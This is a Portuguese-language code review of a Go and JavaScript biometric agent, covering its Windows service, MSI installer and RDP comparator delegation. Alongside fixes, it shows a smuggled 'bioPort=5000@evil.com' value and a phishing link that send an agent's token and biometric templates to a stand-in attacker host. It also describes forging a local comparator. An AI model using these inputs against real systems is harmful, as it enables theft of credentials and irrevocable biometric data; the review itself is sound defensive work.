# 🔍 Revisão do PR: Revisão técnica do sistema — 2026-08-07

Revisão do sistema como um todo, com foco no que entrou no commit `26c9379`
(*serviço Windows e MSI para o comparador, e verificação 1:1 pela linha de
comando*), que fecha o desenho iniciado na v1.1.0.

**Escopo analisado:** `main.go`, `sdk.go`, `worker.go`, `comparador.go`,
`delegacao.go`, `anuncio.go`, `servico.go`, `autoteste.go`, `log.go`, `cert.go`,
`origins.go`, `session.go`, `storage.go`, `supervisor.go`, `versaodll.go`, os
`*_test.go`, `instalador/msi/*`, `instalador/instalar-servidor.ps1`,
`conferir-biometria.cmd`, `integracao/integra-biometria.js`, `README.md` e
`.gitignore`.

**Verificações executadas:** `GOOS=windows GOARCH=386 go build ./...` (OK) e
`GOOS=windows GOARCH=386 go vet ./...` (limpo). Os testes não puderam ser
executados: as *build tags* `windows && 386` exigem um alvo real.

---

## 🔴 Problemas Críticos (bloqueia merge)

### C1. Parar o serviço apaga o anúncio, e o token novo derruba todos os agentes de pé

**Arquivos:** `comparador.go:94-99`, `anuncio.go:101-121`

```go
if err := publicaAnuncio(porta, segredo); err != nil { ... }
defer removeAnuncio()          // comparador.go:99
```

```go
// Reaproveitar o token publicado importa: a cada reinicio do servico um token
// novo invalidaria os agentes que ja estao de pe, e eles so descobririam isso
// como 401 no meio de um atendimento.
func tokenDoComparador() (string, error) {
	if t := os.Getenv("COMPARADOR_TOKEN"); len(t) >= 32 { return t, nil }
	if a, err := leAnuncio(); err == nil { return a.Token, nil }   // anuncio.go:117
	return geraToken()
}
```

**Por que é um problema.** O comentário de `tokenDoComparador` descreve
exatamente a falha que o código produz. O reaproveitamento do segredo depende de
`leAnuncio()` encontrar o arquivo — e o `defer removeAnuncio()` apaga esse mesmo
arquivo em toda parada limpa do serviço. Numa instalação por MSI (sem
`COMPARADOR_TOKEN` no ambiente da máquina), a sequência é:

1. `net stop AgenteBiometriaComparador` → `cancelaApp()` → `Serve` retorna →
   `removeAnuncio()` apaga `C:\ProgramData\AgenteBiometria\comparador.json`;
2. `net start` → `tokenDoComparador()` não acha ambiente nem anúncio → `geraToken()`
   → **segredo novo**;
3. os agentes das sessões RDP já abertas guardaram o token antigo em
   `comparadorRemoto.token` (`delegacao.go:86-97`) e nunca releem o anúncio —
   `configuraComparador()` é chamado uma única vez, em `main.go:890`;
4. toda comparação e toda identificação passam a responder **401**, no meio do
   atendimento, para todos os usuários do servidor, até cada um fazer logoff.

Ironicamente o caminho que funciona é o de falha: quando a DLL derruba o
processo, os `defer` não rodam, o anúncio sobrevive e o token é reaproveitado. É
a parada limpa — a que o administrador faz de propósito — que quebra tudo.

O MSI agrava: `MajorUpgrade Schedule="afterInstallInitialize"`
(`AgenteBiometria.wxs:33`) desinstala a versão anterior antes de instalar a nova,
e o componente `CompDados` remove `comparador.json` no uninstall
(`AgenteBiometria.wxs:125`). Ou seja, **toda atualização de versão também
invalida o token de todos os agentes vivos**.

**Como corrigir.** Separar o segredo (que precisa sobreviver ao ciclo do serviço)
do anúncio de liveness (que precisa morrer junto com ele), e dar ao agente uma
forma de se recuperar:

```go
// anuncio.go — o token passa a viver num arquivo proprio, que a parada nao apaga.
func tokenDoComparador() (string, error) {
	if t := os.Getenv("COMPARADOR_TOKEN"); len(t) >= 32 {
		return t, nil
	}
	caminho := filepath.Join(diretorioCompartilhado(), "comparador-token")
	if b, err := os.ReadFile(caminho); err == nil && len(strings.TrimSpace(string(b))) >= 32 {
		return strings.TrimSpace(string(b)), nil
	}
	t, err := geraToken()
	if err != nil {
		return "", err
	}
	return t, gravaArquivoAtomico(caminho, []byte(t+"\n"), 0o600)
}
```

E, no lado do agente, reler o anúncio quando a credencial for recusada, em vez de
morrer com ela:

```go
// delegacao.go — 401 significa "o servico reiniciou", nao "desista".
if resp.StatusCode == http.StatusUnauthorized {
	if a, err := leAnuncio(); err == nil && a.Token != c.token {
		c.token = a.Token
		return errRepetir   // uma unica repeticao, para nao virar laco
	}
}
```

---

### C2. O endereço do comparador vem de variável de ambiente do usuário e não é validado como loopback

**Arquivos:** `anuncio.go:47-57`, `delegacao.go:49-85`

```go
var diretorioCompartilhado = func() string {
	base := os.Getenv("ProgramData")            // anuncio.go:48
	if base == "" { base = `C:\ProgramData` }
	return filepath.Join(base, "AgenteBiometria")
}
```

```go
endereco, err := url.Parse(base)                                    // delegacao.go:75
if err != nil || endereco.Host == "" ||
	(endereco.Scheme != "http" && endereco.Scheme != "https") {     // qualquer host serve
	registraErro("endereco do comparador invalido (%q): a comparacao continua local", base)
	return
}
```

**Por que é um problema.** O agente roda como o usuário logado, e `ProgramData` é
uma variável de ambiente que o processo do usuário controla. Quem consegue
executar código na sessão (malware, um atalho adulterado, um `.bat` no logon)
aponta `ProgramData` para uma pasta própria, planta um `comparador.json` e o
agente passa a delegar para o endereço que estiver ali — que **não precisa ser
loopback**, porque a validação aceita qualquer host `http`/`https`.

O mesmo vale sem tocar no ambiente: a ACL padrão de `C:\ProgramData` permite que
qualquer usuário **crie** subpastas. Num servidor onde o serviço ainda não rodou
(ou antes do MSI), um usuário comum cria `C:\ProgramData\AgenteBiometria`, torna-se
`CREATOR OWNER` da pasta e passa a controlar o conteúdo dela para todos os
outros.

O impacto vai além de vazamento. `compara()` devolve o booleano que o sistema web
usa como veredito biométrico (`delegacao.go:140-147`, consumido em
`main.go:436-460`), então um comparador falso:

- **recebe os templates em claro** — dado pessoal irrevogável, LGPD;
- **responde `true` para qualquer par** — burla a verificação biométrica de todo
  o sistema, sem tocar no backend.

A nota de desenho em `anuncio.go:18-23` assume que o risco é apenas "qualquer
usuário lê o segredo". Escrever no arquivo, e escolher o destino, é um risco de
outra ordem.

**Como corrigir.** Duas mudanças pequenas e independentes:

```go
// anuncio.go — a pasta compartilhada nao pode vir do ambiente do usuario.
var diretorioCompartilhado = func() string {
	if p, err := windows.KnownFolderPath(windows.FOLDERID_ProgramData, 0); err == nil {
		return filepath.Join(p, "AgenteBiometria")
	}
	return filepath.Join(`C:\ProgramData`, "AgenteBiometria")
}
```

```go
// delegacao.go — o comparador e um servico local; endereco remoto e sempre erro.
func ehLoopback(u *url.URL) bool {
	host := u.Hostname()
	if strings.EqualFold(host, "localhost") {
		return true
	}
	ip := net.ParseIP(host)
	return ip != nil && ip.IsLoopback()
}

if !ehLoopback(endereco) {
	registraErro("comparador anunciado fora do loopback (%q): recusado, a comparacao continua local", base)
	return
}
```

E, no instalador, criar `C:\ProgramData\AgenteBiometria` com ACL explícita
(SYSTEM/Administradores: total; Users: apenas leitura), em vez de depender da
herança.

---

### C3. `bioPort` continua concatenado sem validação — token e templates saem para um host arbitrário

**Arquivo:** `integracao/integra-biometria.js:26-29`, `144-151`, `173-175`

> Este item foi reportado na revisão de **2026-07-30** (item C1) e **continua sem
> correção**. Repito aqui porque é o problema mais grave do sistema em produção.

```js
var h = new URLSearchParams((location.hash || '').replace(/^#/, ''))
if (h.get('bioPort')) {
  localStorage.setItem(LS_ADDR, protocolos()[0] + '://localhost:' + h.get('bioPort'))
}
```

**Por que é um problema.** O valor do fragmento entra direto na URL base. Com
`bioPort=5000@evil.com`, o resultado é `http://localhost:5000@evil.com` — para o
`fetch`, `localhost:5000` vira *userinfo* e o host real passa a ser `evil.com`. A
partir daí, todo `requisicao()` (`integra-biometria.js:83-101`) envia:

- o header `X-Bio-Token` com o token vivo do agente daquela sessão;
- o corpo de `/api/public/v1/captura` e `/api/public/v1/identificar` — **templates
  biométricos em claro**.

O endereço fica em `localStorage`, então o vazamento persiste entre recarregamentos
e abas. Um link de phishing apontando para o site legítimo
(`https://sistema.exemplo.com/atendimento#bioPort=5000@evil.com`) basta, e o
fragmento nem chega ao servidor do integrador — não aparece em log nenhum. O mesmo
buraco está em `conecta()` (linha 147), que confia no campo `porta` devolvido pelo
`/api/hello`, e em `configurar({ porta })` (linha 174).

**Como corrigir.** Validar como inteiro na faixa de escuta, num ponto único:

```js
function portaValida(valor) {
  var n = Number(valor)
  return Number.isInteger(n) && n >= 1 && n <= 65535 ? n : null
}

function defineEndereco(proto, porta) {
  var p = portaValida(porta)
  if (!p) return false
  localStorage.setItem(LS_ADDR, proto + '://localhost:' + p)
  return true
}
```

e trocar as três atribuições de `LS_ADDR` por chamadas a `defineEndereco`.

---

### C4. Dois instaladores disputam o mesmo comparador na mesma porta — o MSI falha nos servidores já instalados

**Arquivos:** `instalador/msi/AgenteBiometria.wxs:71-99`,
`instalador/instalar-servidor.ps1:167-193`

O PS1 registra o comparador como **tarefa agendada** chamada
`AgenteBiometriaComparador`, em SYSTEM, ouvindo em `COMPARADOR_PORTA` (padrão
5150), e grava `COMPARADOR_URL`/`COMPARADOR_TOKEN`/`COMPARADOR_PORTA` no ambiente
da máquina. O MSI registra um **serviço Windows** com o mesmo nome, na mesma
porta padrão.

**Por que é um problema.** Nos cinco servidores RDP que já receberam a v1.1.0 pelo
PS1, a tarefa agendada sobe no boot e ocupa a 5150. Quando o MSI instalar:

1. `ServiceControl Start="install" Wait="yes"` manda o SCM iniciar o serviço;
2. o serviço tenta `net.Listen` em `127.0.0.1:5150`, falha (`comparador.go:85-90`)
   e retorna 1;
3. `servico.go:41-45` reporta `Stopped` com código diferente de zero;
4. com `Vital="yes"` no `ServiceInstall`, o start falhando **derruba a instalação
   inteira em rollback**.

E nenhum dos dois desinstaladores conhece o outro: o `-Desinstalar` do PS1
(`instalar-servidor.ps1:104-118`) remove a tarefa e as variáveis de máquina mas
não toca no serviço; o MSI remove o serviço mas não a tarefa nem as variáveis.
Uma máquina no meio do caminho fica com os dois registrados.

**Como corrigir.** Uma ação customizada no MSI, antes de `InstallServices`, que
faça a migração:

```xml
<CustomAction Id="RemoveTarefaLegada" Directory="PASTAINSTALACAO" Execute="deferred"
    Impersonate="no" Return="ignore"
    ExeCommand="schtasks.exe /Delete /TN AgenteBiometriaComparador /F" />
<InstallExecuteSequence>
  <Custom Action="RemoveTarefaLegada" Before="InstallServices" Condition="NOT Installed" />
</InstallExecuteSequence>
```

acompanhada da limpeza das três variáveis de máquina (`RemoveRegistryValue` em
`HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment`) e de uma nota
de migração no README. Enquanto isso não existir, documentar que o
`-Desinstalar` do PS1 é pré-requisito do MSI.

---

## 🟡 Alertas (recomenda correção)

### A1. O comparador não tem limite de concorrência e serializa o servidor inteiro numa thread

**Arquivos:** `comparador.go:75-78`, `101-111`, `main.go:100-105`, `205-263`

O `limiteHTTP` (32 slots) vive dentro de `middleware`, que o modo comparador **não
usa** — ele monta o mux e o embrulha apenas em `exigeSegredo`. Sobra só o
`limiteIdentificar` (2 slots, `main.go:475-492`); `/comparar` fica sem teto
nenhum.

Pior que o teto ausente é o gargalo: todas as chamadas passam por `naThreadSDK`,
consumidas por uma única goroutine presa a um único OS thread
(`sdkThreadMain`, `main.go:100-105`). Num servidor RDS, isso significa que **as
comparações de todas as sessões disputam uma fila de um**. Um `/identificar` com
5.000 candidatos segura essa thread por até 3 minutos (`worker.go:340-343`),
enquanto o contexto de cada `/comparar` concorrente é de 45 s (`main.go:432`) —
todos expiram antes de chegar a vez. Como qualquer usuário logado consegue ler o
token (o próprio `anuncio.go:18-23` reconhece isso), qualquer um pode parar a
biometria do servidor sem nenhum privilégio.

Sugestão: aplicar um limitador no comparador (o mesmo padrão de `limiteHTTP`) e
avaliar um pool de threads/workers de SDK — comparar não usa leitor, então nada
impede N processos worker atendendo em paralelo.

### A2. O `worker.log` do comparador vai para o perfil do SYSTEM — exatamente o problema que o `comparador.log` corrigiu

**Arquivos:** `worker.go:68`, `log.go:16-22`, `comparador.go:40`

O comparador teve o cuidado de gravar em `ProgramData`:

```go
// Ao lado do anuncio, e nao no perfil do usuario: como servico, o perfil e
// o do SYSTEM, e o log sumiria dentro de SysWOW64\config\systemprofile.
iniciaLogEm(diretorioCompartilhado(), "comparador.log")
```

Mas o worker que ele sobe faz `iniciaLogArquivo("worker.log")`, que passa por
`garanteDiretorioDados()` → `%LOCALAPPDATA%` → e como serviço isso é
`C:\Windows\SysWOW64\config\systemprofile\AppData\Local\BiometriaAgente\worker.log`.
É justamente o log que importa: o worker é onde a `NBioBSP.dll` roda e onde as
quedas acontecem, e é lá que fica a impressão do template que o desenho usa para
provar se os bytes mudaram ao cruzar o processo (`worker.go:150-153`).

Sugestão: o worker herdar o diretório de log do pai por variável de ambiente,
junto de `BIO_WORKER_DLL`:

```go
cmd.Env = append(os.Environ(), "BIO_WORKER=1", "BIO_WORKER_DLL="+c.dll,
	"BIO_LOG_DIR="+dirDeLogAtual())
```

### A3. Anúncio órfão nunca é detectado e não há volta para a comparação local

**Arquivo:** `anuncio.go:59-80`

`leAnuncio` valida porta e tamanho do token, mas não confere se o `PID` ainda
existe nem se a porta atende. Se o serviço morrer sem rodar os `defer` (kill,
queda de energia, `0xC0000005` dentro da DLL), o arquivo fica para trás e todo
agente que subir depois delega para uma porta morta — cada comparação falha com
`comparador inacessivel` (`delegacao.go:116`) e nunca cai de volta para o modo
local.

Sugestão: em `configuraComparador`, sondar `GET /status` uma vez com prazo curto
antes de assumir a delegação, e registrar em log a decisão tomada.

### A4. O `comparador.log` em `ProgramData` expõe os vereditos de todos os usuários

**Arquivos:** `comparador.go:40`, `main.go:430-431`, `458-459`

O log fica numa pasta legível por `Users` e registra, para cada atendimento:

```
comparacao: recebeu benef=[248 bytes sha256:a1b2c3d4e5f6] lida=[...]
comparacao: benef=[248 bytes sha256:a1b2c3d4e5f6] confere=true
```

Não há template ali — esse cuidado está certo. Mas qualquer usuário do servidor
lê quem foi verificado, quando, e se conferiu, além de poder correlacionar
cadastros pelo `sha256` entre execuções. Num servidor multiusuário isso é
informação de outros atendimentos.

Sugestão: ACL explícita na pasta (leitura só para Administradores e SYSTEM),
mantendo apenas `comparador.json` legível por `Users`.

### A5. O cliente JS descarta `ignorados`, que é justamente o que o Go se esforçou para produzir

**Arquivo:** `integracao/integra-biometria.js:222-230`

```js
return { confere: !!r.confere, id: r.id || '' }
```

`sdk.go:480-533` e `main.go:511-576` fazem um trabalho considerável para separar
"não é a pessoa" de "o cadastro dessa pessoa está corrompido", inclusive com log
dedicado quando ninguém confere e há ignorados (`main.go:567-572`). O cliente que
os integradores realmente usam joga isso fora, e o sistema web volta a ver só
`confere: false`.

Sugestão: `return { confere: !!r.confere, id: r.id || '', ignorados: r.ignorados || [] }`
e documentar em `COMO-USAR.md` que uma lista não vazia com `confere: false` pede
recadastramento, não nova tentativa.

### A6. O MSI não para os agentes das sessões e vai esbarrar em arquivo em uso

**Arquivo:** `instalador/msi/AgenteBiometria.wxs:31-35`, `66-100`

`MajorUpgrade` para e remove o serviço, mas nada trata os `AgenteBiometria.exe`
que estão rodando na bandeja de cada sessão RDP a partir do mesmo caminho em
`Program Files (x86)`. Numa atualização com usuários conectados, o Windows
Installer detecta arquivo em uso e, em instalação silenciosa (`/qn`), agenda
reboot. O PS1 resolvia isso instalando cada versão num diretório com o hash do
binário (`instalar-servidor.ps1:142-149`), justamente para não haver substituição
de arquivo em uso — o MSI regrediu esse ponto.

Sugestão: `util:CloseApplication` com `Target="AgenteBiometria.exe"` e
`RebootPrompt="no"`, ou voltar ao esquema de diretório por versão.

### A7. A condição de versão do Windows deixa passar o que a mensagem diz recusar

**Arquivo:** `instalador/msi/AgenteBiometria.wxs:39-41`

```xml
<Launch Condition="VersionNT64 OR VersionNT >= 603"
        Message="Este instalador exige Windows 8.1/2012 R2 ou mais novo." />
```

Num Windows 7 x64, `VersionNT64` é verdadeiro e `VersionNT` é 601 — a condição
passa e a mensagem nunca aparece. A intenção está toda em `VersionNT >= 603`;
`VersionNT64` só afrouxa a regra.

### A8. Não há CI, e os testes na prática nunca rodam

Não existe `.github/workflows`. São ~900 linhas de teste (48 funções `Test*`) que,
por causa das *build tags* `windows && 386`, só compilam e rodam num alvo Windows
x86 real — nenhuma máquina de desenvolvimento comum executa `go test ./...` com
sucesso. `servico.go`, introduzido neste commit, não tem teste nenhum, e o
comportamento de `Execute` (ordem `pronto`/`saida`, parada dentro do prazo) é
testável sem Windows real com um canal falso.

Sugestão mínima: um workflow com `GOOS=windows GOARCH=386 go build ./...` e
`go vet ./...` — que é o que já se verifica à mão a cada revisão — e um *runner*
Windows para o `go test` quando houver.

---

## 🟢 Sugestões (opcional)

- **S1.** O README não foi atualizado para o commit: MSI, serviço Windows e o
  anúncio em `ProgramData` não aparecem em lugar nenhum. "Instalação no servidor"
  ainda descreve só o `instalar-servidor.ps1`, a tabela de configuração ainda
  apresenta `COMPARADOR_URL`/`COMPARADOR_TOKEN` como a única forma de ligar a
  delegação, e "Estrutura do projeto" não lista `anuncio.go`, `comparador.go`,
  `delegacao.go`, `servico.go`, `conferir-biometria.cmd` nem `instalador/msi/`.
  Dado o C4, a seção de instalação é o lugar certo para a nota de migração.
- **S2.** O MSI não instala o `conferir-biometria.cmd`. O script procura o exe em
  `%ProgramFiles(x86)%\AgenteBiometria\` (`conferir-biometria.cmd:26`), então
  funcionaria se fosse junto — hoje precisa ser copiado à mão.
- **S3.** `build-msi.cmd:35` omite o `-trimpath` que o README prescreve, e fixa
  `D:\dotnet-sdk` / `D:\nuget-cache` (`build-msi.cmd:16-17`). São defaults de uma
  máquina específica; valem como *fallback*, mas o build deveria seguir sem eles.
- **S4.** `0o600` e `0o644` em `gravaArquivoAtomico` (`storage.go:45`) e
  `iniciaLogEm` (`log.go:32,40`) não têm efeito no Windows — `Chmod` só liga e
  desliga o atributo somente-leitura. A proteção real vem da ACL herdada. Vale um
  comentário dizendo isso, para ninguém ler o `0o600` como garantia.
- **S5.** Em `middleware` (`main.go:252-260`), o `case <-r.Context().Done()`
  convive com um `default` no mesmo `select`: como o `default` impede o bloqueio,
  aquele ramo só é escolhido se o contexto já estiver cancelado. Se a intenção era
  esperar por uma vaga, o `default` sobra; se era não esperar, o caso do contexto
  sobra.
- **S6.** A rotação de log gera `comparador.log.1` (`log.go:36-39`), que o
  `RemoveFile` do MSI (`AgenteBiometria.wxs:126`) não remove — o `RemoveFolder`
  seguinte falha em pasta não vazia e deixa o resto para trás.
- **S7.** `exec.Command("rundll32", ...)` (`main.go:782`) e
  `exec.Command("certutil.exe", ...)` (`cert.go:116`) resolvem pelo `PATH`. Um
  diretório gravável antes do `System32` no `PATH` sequestra a chamada. Usar
  caminho absoluto a partir de `%SystemRoot%\System32`.

---

## 📋 Resumo

- **Arquivos alterados**: 16 no commit `26c9379` (+1.044 / −102); 39 arquivos
  revisados no sistema
- **Segurança**: 🚨 Risco — C2 (delegação para host arbitrário) e C3 (`bioPort`
  não validado, aberto desde 2026-07-30) permitem exfiltração de template e
  veredito biométrico forjado
- **Qualidade**: ⚠️ Atenção — o código é bem estruturado e excepcionalmente bem
  comentado, mas C1 é uma contradição direta entre o comentário e o
  comportamento, e A2 repete no worker um problema já resolvido ao lado
- **Risco de produção**: 🚨 Alto — C1 derruba a biometria de todas as sessões a
  cada parada do serviço, C4 faz a instalação falhar nos cinco servidores que já
  rodam a v1.1.0, e A1 permite que qualquer usuário logado pare a comparação do
  servidor
- **Testes**: ⚠️ Parcial — 48 testes cobrem bem anúncio, delegação, normalização,
  worker e leitura de template; `servico.go` está sem cobertura, não há teste do
  ciclo publicar/parar/reiniciar (que é o C1) e nada roda automaticamente (A8)

---

## ✅ Pontos positivos

- **Os comentários explicam o porquê, não o quê.** `anuncio.go:5-23`,
  `comparador.go:5-16` e `delegacao.go:5-23` registram a decisão de projeto e a
  alternativa descartada. Isso é raro e é o que torna a revisão possível — vários
  achados acima saíram de comparar o comentário com o código, o que só existe
  porque o comentário diz algo verificável.
- **O `pronto` antes do `Running`.** `servico.go:38-46` só reporta ao SCM depois
  que a porta aceita conexões. É a diferença entre um serviço "de pé" que falha na
  primeira comparação e uma falha visível no `services.msc`, na hora.
- **O worker encerrado explicitamente na saída** (`comparador.go:132-141`), com
  contexto novo porque `ctxApp` já morreu. O raciocínio sobre o processo órfão
  segurando o executável está certo e é o tipo de detalhe que só aparece depois de
  doer.
- **Comparação em tempo constante** no `exigeSegredo` (`comparador.go:151-166`) e
  no token do agente (`main.go:247`), com a justificativa correta: segredo de vida
  longa contra atacante local.
- **`normalizaTemplate` é rigoroso pelo motivo certo** (`sdk.go:396-421`): a
  violação de acesso dentro da DLL não vira `panic` do Go, então validar antes é a
  única defesa. Restringir a ASCII imprimível contínuo é a regra mais forte que o
  formato permite.
- **Templates nunca aparecem em log.** `impressaoTemplate` (`sdk.go:427-434`) e
  `forma` (`autoteste.go:128-139`) foram desenhados para diagnosticar sem expor, e
  há teste dedicado (`TestImpressaoTemplateNaoVazaOTemplate`). O `.gitignore`
  fecha o cerco com `*.hash`, `.env.*` e `template*.txt`.
- **Os códigos de saída do `--conferir-contra`** (`autoteste.go:411-423`) separam
  "não é a pessoa" (2) de "quebrou" (1). São providências opostas, e um script que
  confundisse as duas erraria em silêncio.
- **`leTemplateDeArquivo`** (`autoteste.go:379-409`) trata o `=` de preenchimento
  do base64 exigindo que o valor resultante seja um template válido, em vez de
  cortar na primeira ocorrência. É o caso difícil, resolvido sem gambiarra.
- **`identifica` não deixa um cadastro podre bloquear a lista** (`sdk.go:473-533`),
  e ainda distingue checksum (pula) de erro de SDK (aborta).
- `GOOS=windows GOARCH=386 go build ./...` compila e `go vet ./...` sai limpo.

---

## Veredicto: **MUDANÇAS NECESSÁRIAS**

O desenho está certo e o C1 é o mais urgente porque não depende de atacante
nenhum: basta um `net stop`/`net start` no comparador para toda a biometria do
servidor passar a responder 401. Junto com o C4, que faz o MSI falhar exatamente
nas máquinas onde ele precisa entrar, os dois bloqueiam a implantação da v1.2.0
nos cinco servidores. O C3 continua aberto desde 30/07 e é o de maior impacto se
explorado.
